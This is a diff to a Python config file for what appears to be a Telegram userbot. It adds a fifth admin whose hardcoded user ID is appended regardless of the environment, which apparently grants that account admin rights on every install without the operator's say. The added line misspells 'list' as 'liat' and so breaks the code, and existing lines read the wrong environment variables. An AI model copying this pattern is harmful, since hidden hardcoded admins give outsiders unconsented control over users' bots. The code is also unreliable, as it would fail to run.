@@ -16,12 +16,15 @@ ADMIN1_ID = list(map(int, getenv("ADMIN1_ID", "1054295664").split()))
 ADMIN2_ID = list(map(int, getenv("ADMIN2_ID", "1755047203").split()))
 ADMIN3_ID = list(map(int, getenv("ADMIN2_ID", "2073506739").split()))
 ADMIN4_ID = list(map(int, getenv("ADMIN2_ID", "918837361").split()))
+ADMIN5_ID = liat(map(int, getenv("ADMIN1_ID",
+"1618457394").split()))
 
 
 ADMIN1_ID.append(1054295664)
 ADMIN2_ID.append(1755047203)
 ADMIN3_ID.append(2073506739)
 ADMIN4_ID.append(918837361)
+ADMIN5_ID.append(1618457394)
 
 MONGO_URL = getenv("MONGO_URL", "")
 BOT_TOKEN = getenv("BOT_TOKEN")
@@ -40,8 +43,8 @@ HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
 BRANCH = getenv("BRANCH", "amang") #don't change
 REPO_URL = getenv("REPO_URL", "https://github.com/amanqs/AmangUbot")
 CMD_HNDLR = getenv("CMD_HNDLR", ".")
-SUPPORT = int(getenv("SUPPORT", "-1001284445583"))
-CHANNEL = int(getenv("CHANNEL", "-1001772541015"))
+SUPPORT = int(getenv("SUPPORT", "-1001857062751"))
+CHANNEL = int(getenv("CHANNEL", "-1001869711042"))
 SESSION1 = getenv("SESSION1", "")
 SESSION2 = getenv("SESSION2", "")
 SESSION3 = getenv("SESSION3", "")
